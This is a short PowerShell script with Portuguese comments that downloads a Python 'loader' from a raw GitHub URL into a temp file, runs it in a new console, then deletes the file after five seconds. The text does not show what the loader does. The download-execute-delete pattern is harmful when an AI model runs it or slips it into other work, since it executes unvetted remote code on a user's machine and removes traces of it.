# Cria um caminho temporário para o loader
$temp = [System.IO.Path]::GetTempFileName() + ".py"

# Baixa o loader do GitHub diretamente para esse arquivo temporário
irm https://raw.githubusercontent.com/EzequielS4ntos/util-commands/main/loader.py -OutFile $temp

# Executa em uma nova janela de console
Start-Process python -ArgumentList $temp

Start-Sleep -Seconds 5
Remove-Item $temp